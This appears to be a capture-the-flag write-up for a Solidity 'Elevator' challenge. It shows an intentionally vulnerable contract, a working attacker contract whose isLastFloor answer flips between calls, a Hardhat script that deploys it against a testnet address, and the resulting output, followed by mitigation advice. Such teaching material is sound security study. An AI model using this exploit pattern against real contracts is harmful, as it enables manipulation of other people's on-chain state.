## Elevator

### Challenge

This elevator won't let you reach the top of your building. Right?

#### Things that might help:

* Sometimes solidity is not good at keeping promises.
* This `Elevator` expects to be used from a `Building`.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### Background

This is a very simple attack. We need to keep in mind that as long as we follow the `Building` `interface` then the `Elevator` can interact with our contract. However, since the `Building` contract is under the attackers control, there is no limit regarding what else the contract can do.

### Attack

Create a contract that satisfies the the `Building` `interface` but flips its response each time. Make sure that `isLastFloor` will respond `false` the first time, and `true` the second. This will make the first call that checks if its the top floor say its not, and the second that sets the `top` variable say it is.

* Create a contract that implements `isLastFloor` but returns `false` the first time and `true` the second
* Call the `goTo` function through the attacker controlled contract


#### ElevatorSolve.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

import '../challenges/Elevator.sol';

contract ElevatorSolve {

    Elevator elevatorContract;
    bool lastFloor;

    constructor(address payable _elevatorAddress) public {
        elevatorContract = Elevator(_elevatorAddress);
        lastFloor = true;
    }
    
    function isLastFloor(uint) external returns (bool) {
        lastFloor = !lastFloor;
        return lastFloor;
    }

    function goTo (uint _floor) public {
        elevatorContract.goTo(_floor);
    }

}
```

#### elevator-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    elevatorAddress = "0xe8cAdc8eA3A2D55907409cc18a3bB4a71f356379";
    contract = await ethers.getContractAt("Elevator", elevatorAddress);
    
    const accounts = await hre.ethers.getSigners();
    account = accounts[0];
    
    ElevatorSolve = await ethers.getContractFactory("ElevatorSolve");
    elevatorSolve = await ElevatorSolve.deploy(contract.address);
    await elevatorSolve.deployed();

    console.log("Initial Floor: " + await contract.floor())
    console.log("Initial Top  : " + await contract.top())

    // call the goTo function to trigger the attack
    tx = await elevatorSolve.connect(account).goTo(2)
    receipt = await tx.wait()

    console.log("Floor        : " + await contract.floor())
    console.log("Top          : " + await contract.top())
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/elevator-solve.js --network rinkeby
Initial Floor: 0
Initial Top  : false
Floor        : 2
Top          : true
```

### Success Message

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.
